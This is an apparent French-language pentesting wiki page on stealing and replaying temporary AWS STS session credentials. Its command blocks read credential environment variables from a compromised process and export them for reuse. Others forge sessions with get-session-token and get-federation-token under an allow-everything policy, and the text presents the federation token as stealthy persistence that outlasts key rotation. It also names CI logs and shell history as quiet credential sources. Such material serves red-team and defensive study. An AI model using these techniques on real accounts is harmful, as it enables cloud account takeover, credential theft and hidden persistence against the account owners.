---
title: "Jetons STS : capturer et rejouer des identifiants de session temporaires"
order: 3
description: "Capturer et rejouer des jetons de session STS éphémères (AccessKeyId, SecretAccessKey, SessionToken) récupérés dans des processus, des journaux et des variables d'environnement."
keywords:
  - STS
  - jeton de session
  - identifiants temporaires
  - SessionToken
  - rejeu
---

# Jetons STS

Les identifiants STS temporaires forment un triplet : une clé d'accès préfixée `ASIA`, un secret et un **jeton de session**, avec une expiration. C'est ce que les rôles, la fédération et le service de métadonnées distribuent, et ils sont réutilisables depuis n'importe où jusqu'à leur expiration ; aussi, les subtiliser dans un processus, une ligne de journal ou une variable d'environnement suffit souvent à poursuivre en tant que principal.

## Capturer et rejouer

```bash
# in a compromised process environment
env | grep -E 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)'

export AWS_ACCESS_KEY_ID=ASIA... \
       AWS_SECRET_ACCESS_KEY=... \
       AWS_SESSION_TOKEN=...
aws sts get-caller-identity           # confirm identity and that it is still valid
```

## Vérifier la portée et la durée de vie

```bash
aws sts get-caller-identity           # the assumed-role ARN tells you what you are
# decode the token's expiry from the source that issued it (role max-session-duration)
```

## Forger et prolonger des sessions

Détenir la clé à long terme d'un utilisateur permet à STS de forger de nouvelles sessions à utiliser ailleurs :

```bash
# MFA-gated session, where a policy requires MFA for the actions you want
aws sts get-session-token --serial-number <mfa-arn> --token-code 123456

# a scoped session that also feeds a console URL; GetFederationToken
# sessions last up to 36 hours
aws sts get-federation-token --name op \
  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

`GetFederationToken` est un levier de persistance discret : le triplet qu'il renvoie alimente une URL de connexion à la console (voir [credential brokers](credential-brokers.md)) et continue de fonctionner après la rotation de la clé d'origine, pour toute la durée de vie du jeton.

## Notes d'exploitation

- Lorsqu'un appel d'API est refusé avec un message d'autorisation encodé, `aws sts decode-authorization-message --encoded-message <msg>` révèle l'action exacte échouée et le contexte de stratégie, cartographiant rapidement les limites du principal.
- Les clés `ASIA` sans le jeton de session sont inutiles ; récupérez toujours les trois éléments.
- Les jetons issus d'un enchaînement de rôles sont plafonnés à une heure ; les jetons issus d'une assumption directe peuvent durer jusqu'à la durée de session maximale du rôle.
- Les identifiants de session apparaissent souvent dans les journaux de CI, les vidages sur incident et l'historique du shell, sources plus discrètes que la mémoire vive.

## Outils

- **AWS CLI** (`sts get-caller-identity`, `get-session-token`, `get-federation-token`, `decode-authorization-message`).
- **aws_consoler** (NetSPI) : convertir un triplet de session en URL de connexion à la console.
- **Pacu** : importer des identifiants de session et poursuivre l'énumération.

## Références

- [AWS: temporary security credentials](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp.html)
- [HackTricks Cloud: STS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-sts-privesc.html)
- [aws_consoler (NetSPI)](https://github.com/NetSPI/aws_consoler)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
